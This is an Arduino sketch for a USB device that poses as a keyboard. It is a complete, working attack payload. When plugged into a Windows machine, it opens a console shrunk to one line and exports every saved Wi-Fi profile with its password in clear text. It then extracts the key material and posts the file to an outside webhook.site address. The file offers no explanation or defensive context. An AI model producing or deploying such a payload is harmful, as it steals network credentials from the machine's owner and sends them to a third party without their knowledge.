#include <Keyboard.h> 

void setup() {
  Keyboard.begin();

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd /k mode con: cols=15 lines=1");
  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %temp%");
  typeKey(KEY_RETURN);
  
    delay(200);
  
   Keyboard.print("netsh wlan export profile key=clear");
  typeKey(KEY_RETURN);
  
    delay(200);
  
  Keyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  typeKey(KEY_RETURN);
  
    delay(200);
  
 Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/180ffece-02af-4566-8ad3-07754fa169f2 -Method POST -InFile Wi-Fi-PASS");
  typeKey(KEY_RETURN);
  
    delay(800);


  Keyboard.print("exit");
  typeKey(KEY_RETURN);

    delay(200);

    
;Keyboard.releaseAll();

  delay(800);

  
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void loop() {}
